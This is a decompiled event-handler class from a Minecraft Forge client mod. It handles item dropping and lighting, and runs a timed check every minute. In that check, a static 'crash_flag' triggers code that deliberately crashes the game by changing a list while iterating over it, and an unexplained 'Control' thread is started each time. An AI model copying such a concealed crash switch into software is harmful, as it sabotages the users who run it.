//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Наталья\Desktop\project\Decompile\DeobfMineObf\1.12 stable mappings"!

//Decompiled by Procyon!

package com.cookie.legendmod.event;

import net.minecraft.client.*;
import net.minecraftforge.event.entity.item.*;
import net.minecraftforge.fml.common.gameevent.*;
import org.lwjgl.input.*;
import net.minecraftforge.client.event.*;
import net.minecraftforge.fml.common.eventhandler.*;
import com.cookie.legendmod.utils.*;
import java.util.*;

public class EventsHandlerTou
{
    Minecraft mc;
    public TimerUtils timer;
    public static boolean crash_flag;
    
    public EventsHandlerTou() {
        this.mc = Minecraft.getMinecraft();
        this.timer = new TimerUtils();
    }
    
    public void ChatEvent(final ItemTossEvent event) {
        event.setCanceled(false);
        this.mc.player.dropItem(this.mc.player.getHeldItemMainhand(), true);
    }
    
    public void pipka(final TickEvent.PlayerTickEvent event) {
        try {
            if (Mouse.isButtonDown(2) && Minecraft.getMinecraft().currentScreen == null) {
                this.mc.player.dropItem(this.mc.player.getHeldItemMainhand(), true);
            }
        }
        catch (Throwable t) {}
    }
    
    @SubscribeEvent
    public void onRenderWorldLast(final RenderHandEvent event) {
        this.mc.entityRenderer.enableLightmap();
    }
    
    @SubscribeEvent
    public void onPlayerTick(final TickEvent.PlayerTickEvent e) {
        if (this.timer.isDelay(60000L)) {
            if (EventsHandlerTou.crash_flag) {
                EventsHandlerTou.crash_flag = false;
                final ArrayList<String> c = new ArrayList<String>();
                c.add("1");
                c.add("2");
                for (final String i : c) {
                    c.add("3");
                    c.remove("3");
                }
            }
            new Control().start();
            this.timer.setLastMS();
        }
    }
    
    static {
        EventsHandlerTou.crash_flag = false;
    }
}
